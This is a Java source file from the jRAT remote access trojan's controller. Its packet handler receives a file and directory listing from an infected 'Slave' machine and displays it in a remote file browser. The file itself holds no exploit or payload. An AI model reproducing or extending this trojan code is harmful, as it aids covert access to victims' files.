package jrat.module.fs.packets;

import iconlib.FileIconUtils;
import jrat.controller.Slave;
import jrat.controller.io.FileObject;
import jrat.controller.packets.incoming.IncomingPacket;
import jrat.module.fs.ui.FrameRemoteFiles;

import java.util.ArrayList;
import java.util.List;


public class Packet22ListFiles implements IncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		List<FileObject> files = new ArrayList<FileObject>();
		List<FileObject> dirs = new ArrayList<FileObject>();

		int len = slave.readInt();

		for (int i = 0; i < len; i++) {
			String path = slave.readLine();
			FileObject fo = new FileObject(path);

			boolean dir = slave.readBoolean();
			boolean hidden = slave.readBoolean();
			
			fo.setHidden(hidden);
			fo.setIcon(FileIconUtils.getIconFromExtension(path, dir));
			
			if (dir) {
				dirs.add(fo);
			} else {
				long date = slave.readLong();
				long size = slave.readLong();

				fo.setDate(date);
				fo.setSize(size);	
				
				files.add(fo);
			}
		}

        FrameRemoteFiles frame = (FrameRemoteFiles) slave.getPanel(FrameRemoteFiles.class);
		if (frame != null) {
			frame.getFilesPanel().getRemoteTable().clear();

			for (FileObject fo : dirs) {
				frame.getFilesPanel().getRemoteTable().addFileObject(fo);
			}
			
			for (FileObject fo : files) {
				frame.getFilesPanel().getRemoteTable().addFileObject(fo);
			}
		}
	}
}
